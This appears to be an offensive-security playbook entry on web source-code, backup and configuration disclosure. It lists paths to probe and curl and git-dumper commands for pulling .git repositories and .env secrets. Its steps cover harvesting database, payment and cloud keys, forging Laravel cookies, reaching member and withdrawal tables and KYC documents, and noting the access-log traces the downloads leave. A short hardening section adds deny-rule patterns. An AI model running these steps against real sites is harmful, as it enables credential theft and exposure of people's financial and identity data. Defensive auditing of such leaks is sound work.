---
title: Source-code / backup / configuration disclosure
cve: None (deployment flaw)
severity: high
cvss: 7.5
product: General web applications (custom PHP/Java/Node sites)
versions: Any
ports: 80, 443, 8080
keywords: .git, .svn, env, backup, zip, sourcemap, swagger, source-code disclosure
verified: false
sources: Compiled from public sources (business logic / implementation / configuration flaws; no CVE; see references below)
---

## Fingerprints

Scan these path categories in priority order (highest hit rates on this type of site):

```
Backups: /www.zip /web.zip /wwwroot.zip /backup.zip /bak.zip /1.zip /<domain>.zip
        /<domain>.tar.gz /db.sql /dump.sql /sql.zip /temp/ /backup/ /bak/
Repositories: /.git/HEAD  /.git/config  /.svn/wc.db  /.hg/
Config: /.env  /.env.bak  /config.php.bak  /config/config.php~  /.index.php.swp
        /application/database.php  /config/database.php  /web.config
Docs:   /swagger-ui.html  /v2/api-docs  /doc.html  /composer.json  /package.json
Frontend: /static/js/app.js.map  /assets/index-*.js.map  /config.js  /env.js
```

Do not rely on 200 alone: inspect `Content-Length`, `Content-Type`, and initial bytes (`PK\x03\x04`=zip, `SQL dump`, `{`=JSON) together; `/.git/HEAD` must return `ref: refs/heads/master` to count as a genuine hit.

## Prerequisites

- The reverse proxy/CDN does not consistently block sensitive suffixes (many block only `/admin`).
- **Connect directly to the origin**: CDNs often cache `.git` as 404 too; the origin reveals the actual state (for origin discovery, see `kb-triage/fingerprint-workflow.md` and the CDN section).

## PoC

```bash
# Repositories
git-dumper http://target/.git/ ./src          # Or GitHack
sqlite3 .svn/wc.db "select local_relpath from NODES limit 50"

# Configuration
curl -s http://target/.env | grep -Ei 'DB_|REDIS|OSS|SMS|PAY|SECRET|APP_KEY'

# Backups (confirm zip format before downloading)
curl -sI http://target/www.zip | grep -Ei 'content-type|content-length'

# Reconstruct frontend source from sourcemaps
npx source-map-explorer app.js.map
```

## Exploitation Steps

1. Scan paths in bulk → upon a hit, immediately retrieve "directly usable secrets": DB credentials, Redis passwords, OSS AK/SK, SMS service keys, payment merchant IDs and private keys, JWT secrets.
2. After dumping `.git`, audit routes and authentication middleware, focusing on endpoints that "check permissions only in the frontend" (alongside `api-idor-bola.md`).
3. Leaked `APP_KEY` in Laravel's `.env` → decrypt/forge framework-encrypted strings and cookies.
4. DB access → member/order/agent/withdrawal-review tables; OSS AK access → enumerate KYC identity documents and statements in buckets.
5. These are static files and leave no deployed artifacts, but downloads leave access-log traces (such as `GET /.git/HEAD`); mark your request times when collecting evidence.

## Remediation and Mitigation (Hardening)

- Apply consistent reverse-proxy deny rules: `\.(git|svn|hg)(/|$)`, `\.(zip|tar\.gz|sql|bak|swp|old|save)$`, `\.env`, `\.map$`.
- Store backups outside webroot; exclude `.env`, `.git`, and sourcemaps from production CI/CD deployments.
- Regularly scan for "deployment leftovers" (the path table above is itself a checklist).

## References

- OWASP WSTG-INFO-05 (enumerating web-server content); GitHack / git-dumper project documentation.
